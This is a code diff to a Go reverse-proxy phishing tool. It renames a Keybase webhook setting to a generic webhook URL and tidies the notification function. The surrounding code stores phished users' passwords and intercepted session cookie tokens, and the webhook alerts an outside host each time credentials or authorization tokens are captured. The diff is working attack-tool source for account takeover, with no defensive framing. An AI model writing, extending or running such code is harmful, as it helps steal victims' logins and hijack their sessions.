@@ -778,10 +778,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if phishedUser != "" && p.cfg.kbWebhookUrl != "" {
+											if phishedUser != "" && p.cfg.webhookUrl != "" {
 												notify := fmt.Sprintf("Captured credentials for %s!", phishedUser)
 												p.WebhookNotify(notify)
-											} else if phishedUser == "" && p.cfg.kbWebhookUrl != "" {
+											} else if phishedUser == "" && p.cfg.webhookUrl != "" {
 												notify := "Credentials captured!"
 												p.WebhookNotify(notify)
 											}
@@ -1060,8 +1060,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						if p.cfg.kbWebhookUrl != "" {
-							notify := "Authorization tokens intercpeted!"
+						if p.cfg.webhookUrl != "" {
+							notify := "Authorization tokens intercepted!"
 							p.WebhookNotify(notify)
 						}
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
@@ -2014,35 +2014,35 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 }
 
 func (p *HttpProxy) WebhookNotify(content string) {
-	payload := map[string]string{
-		"msg": content,
+	if p.cfg.webhookUrl == "" {
+		return
 	}
 
+	payload := map[string]string{"msg": content}
 	jsonPayload, err := json.Marshal(payload)
 	if err != nil {
 		log.Error("Failed to marshal JSON payload: %v", err)
 		return
 	}
 
-	req, err := http.NewRequest("POST", p.cfg.kbWebhookUrl, bytes.NewBuffer(jsonPayload))
+	req, err := http.NewRequest("POST", p.cfg.webhookUrl, bytes.NewBuffer(jsonPayload))
 	if err != nil {
 		log.Error("Failed to create request: %v", err)
 		return
 	}
-
 	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Error("Failed to send request to Keybase webhook: %v", err)
+		log.Error("Failed to send webhook: %v", err)
 		return
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode == http.StatusOK {
-		log.Info("Keybase webhook notification sent")
+		log.Info("Webhook notification sent")
 	} else {
-		log.Error("Failed to send notification to Keybase webhook, status: %v", resp.StatusCode)
+		log.Error("Failed to send webhook, status: %v", resp.StatusCode)
 	}
 }
